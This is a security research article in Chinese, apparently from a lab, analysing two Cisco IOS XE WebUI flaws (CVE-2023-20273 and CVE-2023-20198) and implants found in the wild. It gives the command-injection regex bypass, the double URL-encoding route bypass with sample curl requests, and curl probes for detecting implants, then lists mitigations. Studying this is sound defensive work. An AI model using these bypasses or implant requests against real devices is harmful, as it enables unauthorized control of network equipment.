# Cisco IOS XE 系统 WebUI 未授权命令执行漏洞分析
> 知道创宇404实验室
> 来源：https://www.iotsec-zone.com/article/428

本文将对最近Cisco IOS XE两个非常严重的CVE（CVE-2023-20198，CVE-2023-20273）进行分析总结。

# 1. 环境搭建

我去年购入一台Cisco ISR 4300路由器进行研究，分析其后台命令执行的1day，正好这个路由器也是Cisco IOS XE系统，所以可以直接用Cisco ISR的环境来进行研究。

如果想搭虚拟环境也简单，可以在Google，Zoomeye搜索文件名关键字，不带版本标识，就可以搜到很多旧版本的 `ova`, `qcow2` 文件，不过缺点就是没办法搜到最新版的固件，如果要研究最新版固件，只能在闲鱼上购买。

# 2. CVE-2023-20273

环境搭好后，首先对授权RCE漏洞进行分析，该漏洞原理较简单，问题出在ipv6地址过滤上，相关代码如下所示：

```
function utils.isIpv6Address(ip)
    if utils.isNilOrEmptyString(ip) then
                 return false
        end
        local chunks = utils.splitString(ip,":")
        if #chunks > 8 or #chunks < 3 then
                return false
        end
        for i=1,#chunks do
                if chunks[i] ~="" and chunks[i]:match("([a-fA-F0-9]*)") == nil and tonumber(chunks[i],16) <= 65535 then
                        return false
                end
        end
        return true
end
```

问题出在正则：`chunks[i]:match("([a-fA-F0-9]*)")`，由于没有限制结束字符，也就是说只要构造的字符串开头部分能成功匹配正则，就能通过，下面做个测试：

```
$ cat test.lua
local arg1 = arg[1]
print(arg1:match("([a-fA-F0-9]*)"))
$ lua test.lua "abc;id;"
abcd
```

最新版的patch代码如下：

![0.png](https://www.iotsec-zone.com/api/image/v2/20231113/cwxout44eq1kzhdyqi.png)

###### 图1 IOS XE系统新版与旧版比较代码

正则变成：`ip:match("^([a-fA-F0-9:]+)$")`，这样，基本就没绕过的可能。

命令注入点有好几处：

1.`snortcheck.lua`

![1.png](https://www.iotsec-zone.com/api/image/v2/20231113/cwxovsdpvbmdlgddws.png)
###### 图2 snortcheck.lua文件相关代码

在 `validateSnortRequest` 函数中会对 `ipaddress` 进行检查，但是因为能bypass ipv6的检查，所以这里可以导致命令注入。

2.`softwareMgmt.lua`

![2.png](https://www.iotsec-zone.com/api/image/v2/20231113/cwxox038s2q5bfc0tk.png)

###### 图3 softwareMgmt.lua文件相关代码

在`validateSmuRequest`中会对`ipaddress`进行检查，随后会在`generateUrlAndDestination`中拼接到`url`当中，最后导致命令注入。

3.`softwareUpgrade.lua`

在该文件中有好几处命令注入漏洞，漏洞成因同上，由于没有对`ipaddress`字段进行正确的检查，所以拼接到url当中后，导致命令注入。

# 3. CVE-2023-20198

接着对更严重的未授权漏洞进行分析，我认为该漏洞应该叫**未授权思科命令执行**漏洞，可以以`pri 15`的权限执行任意Cisco命令。

我认为该漏洞出现在nginx的错误配置上，如下所示：

```
location /lua5 {
        internal;
        if ($scheme = http) {
                rewrite /lua5 /webui_wsma_http;
        }

        if ($scheme = https) {
                rewrite /lua5 /webui_wsma_https;
        }
}

location /webui_wsma_http {
        internal;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_pass http://192.168.1.6:$NGX_IOS_HTTP_PORT liin;
}

location /webui_wsma_https {
        internal;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_pass https://192.168.1.6:$NGX_IOS_HTTPS_PORT liin;
}
```

首先，通过审计webui的lua代码可以发现，要执行cli代码，最终都是通过访问`/lua`路径来实现的，但是因为该路径配置了`internal`字段，所以只能通过nginx内部代码来访问该路径。

接着看代码，可以发现，`/lua`路径最终会根据`http`或者`https`来选择访问`/webui_wsma_http(s)` 路径，同样，该路径也是没办法通过外部访问，这部分nginx配置理论上无法绕过。

不过，`/webui_wsma_http(s)`路径也不是最终执行cli命令的地方，最终是通过访问`http(s)://192.168.1.6`来与`iosd`程序进行通信，我们可以进行一个测试。

通过上面的授权RCE漏洞，获取Linux的权限，然后执行如下命令：

```
# ip netns exec 8 curl -kv http://192.168.1.6/webui_wsma_http -d "<xml>"
......
< HTTP/1.1 200 OK
< Date: Thu, 02 Nov 2023 07:15:13 GMT
< Server: cisco-IOS
< Connection: close
< Content-Length: 447
< Content-Type: text/xml
< Expires: Thu, 02 Nov 2023 07:15:13 GMT
< Last-Modified: Thu, 02 Nov 2023 07:15:13 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Accept-Ranges: none
< X-XSS-Protection: 1; mode=block
< X-Content-Type-Options: nosniff
< X-Frame-Options: SAMEORIGIN
<
* Closing connection 0
<?xml version="1.0" encoding="UTF-8"?><SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xml="http://www.w3.org/XML/1998/namespace"><SOAP:Body><SOAP:Fault><faultcode>SOAP:Client</faultcode><faultstring>An unknown XML tag has been received</faultstring><detail><WSMA-ERR:error xmlns:WSMA-ERR="urn:cisco:wsma-errors"><WSMA-ERR:details>xml</WSMA-ERR:details></WSMA-ERR:error></detail></SOAP:Fault></SOAP:Body></SOAP:Envelope>
```

我们可以看出，最终执行cli命令的是`iosd`程序的服务。

我们继续审计nginx配置，可以在`/tmp/nginx.conf`中找到这样一个配置：

```
   location / {
            proxy_read_timeout 900;
            proxy_pass https://192.168.1.6:443/ liin;
            proxy_set_header X-Real-IP       $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header Host $host;
            proxy_set_header Via $server_addr;
         }
```

nginx默认情况下，就是把请求发送给`iosd`后端。这时候产生一个思路，我们可以直接访问：`http://host/webui_wsma_http`来请求到`192.168.1.6`后端

经过测试，该思路行不通，因为这个请求路径，会优先匹配到`location /webui_wsma_http`路由，由于设置了`internal`关键字，所以会返回404。

不过，经过思考，发现该思路其实并没有问题，不过需要迂回一下。nginx服务是会对URL编码进行解码，而`iosd`服务也会进行URL解码操作，如下所示：

```
# ip netns exec 8 curl -kv http://192.168.1.6/webui_wsma%5fhttp -d "<xml>"
...< HTTP/1.1 200 OK
< Date: Thu, 02 Nov 2023 07:30:48 GMT
< Server: cisco-IOS
< Connection: close
< Content-Length: 447
< Content-Type: text/xml
< Expires: Thu, 02 Nov 2023 07:30:48 GMT
< Last-Modified: Thu, 02 Nov 2023 07:30:48 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Accept-Ranges: none
< X-XSS-Protection: 1; mode=block
< X-Content-Type-Options: nosniff
< X-Frame-Options: SAMEORIGIN
<
* Closing connection 0
<?xml version="1.0" encoding="UTF-8"?><SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xml="http://www.w3.org/XML/1998/namespace"><SOAP:Body><SOAP:Fault><faultcode>SOAP:Client</faultcode><faultstring>An unknown XML tag has been received</faultstring><detail><WSMA-ERR:error xmlns:WSMA-ERR="urn:cisco:wsma-errors"><WSMA-ERR:details>xml</WSMA-ERR:details></WSMA-ERR:error></detail></SOAP:Fault></SOAP:Body></SOAP:Envelope>
```

这样就可以有一个二次编码的攻击思路，如果我们发起请求：`http://host/%2577ebui_wsma_http`，那么nginx收到的请求是`http://host/%77ebui_wsma_http`，由于没有匹配到其他路由，所以采用默认路由，发送到`iosd`后端的请求为：`http://192.168.1.6/%77ebui_wsma_http`，并且由于后端的`webui_wsma_http`并没有进行鉴权操作，这样就产生了未授权访问漏洞。

请求的url可以对`webui`任意一个或多个字符进行url编码，都能未授权访问到`iosd`后端，但是对后续的`_wsma_http`进行编码却没有用，因为如果没有对`webui`进行编码，则会优先匹配到`/webui`路由，就无法访问到`iosd`后端。

**官方修复方案**

官方修复方案是添加了一个`Proxy-Uri-Source`头，如果是通过默认路由访问到`iosd`服务的，则设置为：`Proxy-Uri-Source: global`

![3.png](https://www.iotsec-zone.com/api/image/v2/20231113/cwxp8fg8i3g1telldo.png)
###### 图4 iosd在IDA中的相关代码

如果是通`/lua5`路由访问的，则设置为：`Proxy-Uri-Source: webui_internal`

![4.png](https://www.iotsec-zone.com/api/image/v2/20231113/cwxp92b4q1k086ujfz.png)

###### 图5 IOS XE系统新版本新增代码

而`iosd`后端处理`webui_wsma_http`路由时，只有检测到HTTP头为：`Proxy-Uri-Source: webui_internal`，才会正常响应HTTP请求。

不过我认为，该漏洞的核心问题并没有被修复，比如我还找到了如下配置：

```
server {
    include /usr/binos/conf/nginx-conf/https-only/fallback.conf;
    listen unix:/var/run/shell_exec/nginx/pnp_python.sock;
    listen unix:/var/run/shell_exec/nginx/pnp_python_ssl.sock ssl;
    location /pnp_python {
        proxy_pass http://192.168.1.6:80/pnp_python liin;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header Host $host;
        proxy_read_timeout 1d;
        proxy_send_timeout 1d;
        proxy_connect_timeout 1d;
    }
}
```

`iosd`后端还会响应`pnp_python`路由，该路由可以进行哪些操作等待我后续研究。

# 4. 在野利用情况分析

上面两个漏洞最初是Cisco官方公布的，他们估计在自己或者客户的机器上抓到后门马，然后才发现这两个漏洞。

Cisco官方并没有公布漏洞详情，但是公布了如何检测自己的设备是否被攻击者植入了后门马。

**第一种检测方案**

![5.png](https://www.iotsec-zone.com/api/image/v2/20231113/cwxpbb8l7wvaldoz4u.png)
###### 图6 IOS XE后门代码1

上面的代码猜测是Cisco官方在设备中抓到的后门，通过上面的代码我们可以知道：

```
$ curl -kv http://host/webui/logoutconfirm.html?logon_hash=1 -X POST
# 该请求将会返回一串十六进制数，比如
e79ba64cb1922c9cec
# 如果是不存在该后门的设备，将会返回404
```

该后门的作用主要是可以通过访问：`http://host/webui/logoutconfirm.html?logon_hash=???&common_type=subsystem -d "id"`来执行任意Linux系统命令。

最关键的是需要`logon_hash`的值，但是我们无法获取该值，经过研究，猜测每个设备的`logon_hash`值都不同，应该是和前面返回的十六进制是一一对应的关系。

**第二种检测方案**

![6.png](https://www.iotsec-zone.com/api/image/v2/20231113/cwxpcw2gf0un6ibp5h.png)
###### 图7 IOS XE后门代码2

第二种相当于在第一种的情况上进行了升级，增加了认证代码，我们并没办法知道`Authorization`的值为多少，不过Cisco官方却提供给我们了：

```
$ curl -kv http://host/webui/logoutconfirm.html?logon_hash=1 -X POST -H 'Authorization: 0ff4fbf0ecffa77ce8d3852a29263e263838e9bb'
# 该检测方法和上面的同理，就是多了一个Authorization字段
# 除了同样有subsystem后门，还新增了一个common_type=iox后门，可以执行任意Cisco cli命令，不过同样，我们没办法得知logon_hash的值
```
这两种后门我觉得没必要区分，只要使用第二种方案进行探测，就能都检测到目标是否被植入后门。唯一要区分的就是，必须要有`Authorization`字段的目标，会多了一个`iox`功能，用来执行Cisco CLI命令。

**第三种检测方案**

![7.png](https://www.iotsec-zone.com/api/image/v2/20231113/cwxpezty55nb0jnqff.png)
###### 图8 后门代码中的修补代码部分

攻击者不仅在目标设备上留下后门，还对未授权的漏洞进行修补，该路由将会匹配包含`%`百分号的请求，如果请求的`uri`中存在百分号，则返回404。

在正常的设备中，如果请求`http://host/%25`，将会匹配到默认路由，发送给后端`iosd`，得到的返回是：

```
$ ip netns exec 8 curl -kv http://192.168.1.6/%
...
> GET /% HTTP/1.1
> Host: 192.168.1.6
> User-Agent: curl/7.66.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Thu, 02 Nov 2023 08:22:07 GMT
< Server: cisco-IOS
< Connection: close
< Transfer-Encoding: chunked
< Content-Type: text/html; charset=utf-8
< Expires: Thu, 02 Nov 2023 08:22:07 GMT
< Last-Modified: Thu, 02 Nov 2023 08:22:07 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Accept-Ranges: none
< X-XSS-Protection: 1; mode=block
< X-Content-Type-Options: nosniff
< X-Frame-Options: SAMEORIGIN
<
* Closing connection 0
<script>window.onload=function(){ url ='/webui';window.location.href=url;}
```

但是当目标设备存在后门时，将会匹配到上述的路由，返回404，因此可以通过该特性来判断目标服务器是存在后门。

# 5. 对于该漏洞在野情况进行研究

随后对该漏洞在野利用情况进行了研究，在ZoomEye上导出了4w的目标，判断目标是否能RCE，进行无害探测，结果如下：

  date: 2023/11/02 success : 12360 / 48636

使用`logon_hash`探测法，判断目标是否存在后门，结果如下：

  date: 2023/11/02 success : 22205 / 48636

对存在后门的目标进行`%`百分号404探测，结果如下：

  date: 2023/11/02 success : 22195 / 22205

手工检测失败的10个目标，发现其失败都是因为网络问题导致的。

接着对4w的目标进行百分号404探测，结果如下：

  date: 2023/11/02 success : 25341 / 48636

接着对这2.5w的目标进行`logon_hash`探测，结果如下：

  date: 2023/11/02 success : 21441 / 25341

对失败的目标进行研究，发现有大量的蜜罐，能通过百分号404探测，所以导致了大量的误报，排除掉蜜罐目标，剩下的目标进行手动测试，失败原因都是因为网络问题导致的。

从之前的分析加上上面的探测结果，我们可以知道，`logon_hash`后门只有两个版本（有`Authorization`头和没有的），在Cisco官方公布该后门后，暂时没有其他升级。

同样可以得知，该攻击者最初就对未授权的洞进行了修复，存在后门的设备无法RCE，因此我们无法抓到任何有效的后门代码。

上面的探测结果中，我们发现有1w多可以被攻击的目标，其中有几个目标和`logon_hash`探测成功的目标重合，经过研究发现，由于该设备后门驻留的难度比较大，设备一旦重启，后门将会消失，所以导致一些`logon_hash`探测成功的目标，过一段时间后，RCE探测成功，`logon_hash`探测失败。

接着就是统计了一下扫描出来受影响的设备及其架构：

```
ASR1000 Software (X86_64_LINUX_IOSD-UNIVERSALK9_NPE_NOLI-M)
ISR Software (X86_64_LINUX_IOSD-UCMK9-M)
ISR Software (ARMV8EL_LINUX_IOSD-UNIVERSALK9_IAS_NPE-M)
ISR Software (X86_64_LINUX_IOSD-UNIVERSALK9_NPE-M)
ISR Software (ARMV8EB_LINUX_IOSD-UNIVERSALK9_IAS-M)
C9800-CL Software (C9800-CL-K9_IOSXE)
cBR  Software (X86_64_LINUX_IOSD-UNIVERSALK9-M)
ASR1000 Software (X86_64_LINUX_IOSD-UNIVERSALK9_NOLI-M)
c8000be Software (X86_64_LINUX_IOSD-UNIVERSALK9_NPE-M)
ISR Software (ARMV8EL_LINUX_IOSD-UNIVERSALK9_IAS-M)
ISR Software (X86_64_LINUX_IOSD-UNIVERSALK9-M)
ISR Software (ARMV8EL_LINUX_IOSD-UNIVERSALK9-M)
ASR1000 Software (X86_64_LINUX_IOSD-UNIVERSALK9-M)
ISR Software (X86_64_LINUX_IOSD-UNIVERSALK9_IAS-M)
isr1100be Software (X86_64_LINUX_IOSD-UNIVERSALK9-M)
ISR Software (ARMV8EB_LINUX_IOSD-UCMK9-M)
ASR1000 Software (X86_64_LINUX_IOSD-UNIVERSALK9_NPE-M)
C9800-AP Software (C9800-AP-K9_IOSXE-UNIVERSALK9-M)
ISR Software (ARMV8EB_LINUX_IOSD-UNIVERSALK9_IAS_NPE-M)
Catalyst L3 Switch Software (CAT9K_IOSXE)
Virtual XE Software (X86_64_LINUX_IOSD-UNIVERSALK9-M)
C9800 Software (C9800_IOSXE-K9)
cBR Software (X86_64_LINUX_IOSD-UNIVERSALK9-M)
Catalyst L3 Switch Software (CAT3K_CAA-UNIVERSALK9-M)
Catalyst L3 Switch Software (CAT9K_LITE_IOSXE)
ISR Software (ARMV8EL_LINUX_IOSD-UNIVERSALK9_NPE-M)
c8000aep Software (X86_64_LINUX_IOSD-UNIVERSALK9-M)
Virtual XE Software (X86_64_LINUX_IOSD-UCMK9-M)
ISR Software (ARMV8EL_LINUX_IOSD-UNIVERSALK9_IOT-M)
ISR Software (ARMV8EL_LINUX_IOSD-UCMK9-M)
CSR1000V Software (X86_64_LINUX_IOSD-UNIVERSALK9-M)
ISR Software (X86_64_LINUX_IOSD-UNIVERSALK9_IAS_NPE-M)
c8000aes Software (X86_64_LINUX_IOSD-UNIVERSALK9-M)
c8000be Software (X86_64_LINUX_IOSD-UNIVERSALK9-M)
```

update 2023/11/5

随后发现后门再次更新，更新了两部分内容，第一部分：

![8.png](https://www.iotsec-zone.com/api/image/v2/20231113/cwxpjjl6w1ohfoigfa.png)

###### 图9 新版后门的修补代码

该部分更新修复了百分号404探测法。

第二部分：

![9.png](https://www.iotsec-zone.com/api/image/v2/20231113/cwxpjyi1rj8doydkly.png)

###### 图10 新版后门的认证部分

该部分更新让我们更难的通过logon_hash法去探测被入侵的目标，因为`Authorization`不再是一串hash值，而是要求指定值的sha1sum哈希值为指定值，这种情况下，只能通过hash碰撞，爆破sha1哈希值等方法来通过后门的认证检查。

# 6. 修复方案

1.webui端口不暴露在公网上。

2.IOS XE系统更新到官方最新版本。

# 7. 参考链接

1. [https://blog.talosintelligence.com/active-exploitation-of-cisco-ios-xe-software/](https://blog.talosintelligence.com/active-exploitation-of-cisco-ios-xe-software/)

2. [https://www.horizon3.ai/cisco-ios-xe-cve-2023-20198-deep-dive-and-poc/](https://www.horizon3.ai/cisco-ios-xe-cve-2023-20198-deep-dive-and-poc/)
